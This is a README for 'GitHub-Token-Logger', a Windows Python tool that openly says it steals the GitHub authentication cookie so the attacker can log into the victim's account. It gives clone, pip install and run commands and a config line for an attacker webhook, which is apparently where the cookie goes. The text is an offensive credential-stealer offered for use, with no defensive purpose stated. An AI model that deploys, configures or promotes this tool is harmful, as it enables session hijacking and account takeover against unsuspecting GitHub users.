# GitHub-Token-Logger
This script is made in python3, and steals the auth cookie that github uses. You can use this cookie to login to the account, using another script linked in the readme.
I have created a script that allows you to login to the cookie. Link:

## Setup

Depending on your python installation your commands may vary. 
Below are the commands needed to set up.
The script was tested in python 3.8.6, on windows 10. This script only works on windows.

Windows:
```
git clone https://github.com/LocalsGitHub/GitHub-Token-Logger.git
cd GitHub-Token-Logger
pip install browser_cookie3
pip install requests
py logger.py
```
## Config

Once you have opened the script in your desired text editor, there 1 line that you can change.
```
# Enter your webhook below
webhook = "Enter your webhook here"
```

# Support
